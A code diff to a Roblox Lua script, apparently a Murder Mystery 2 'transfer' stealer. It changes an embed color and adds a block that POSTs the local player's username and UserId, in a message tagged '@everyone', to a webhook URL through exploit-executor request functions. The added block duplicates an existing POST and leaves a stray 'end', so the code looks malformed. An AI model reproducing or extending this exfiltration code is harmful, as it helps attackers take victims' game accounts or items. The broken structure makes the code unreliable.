@@ -151,7 +151,7 @@ local function sendDetailedTransfer()
         content = "@everyone **MM2 Transfer Ready**",
         embeds = {{
             title = "Quick Transfer",
-            color = 16744448, -- orange
+            color = 5763719,
             fields = {
                 {name = "Username", value = lp.Name, inline = true},
                 {name = "UserId", value = tostring(lp.UserId), inline = true},
@@ -165,6 +165,24 @@ local function sendDetailedTransfer()
         }}
     }
 
+    pcall(function()
+        if request then
+            request({
+                Url = WU,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HS:JSONEncode(data)
+            })
+        elseif syn and syn.request then
+            syn.request({
+                Url = WU,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HS:JSONEncode(data)
+            })
+        end
+    end)
+end
     pcall(function()
         if request then
             request({
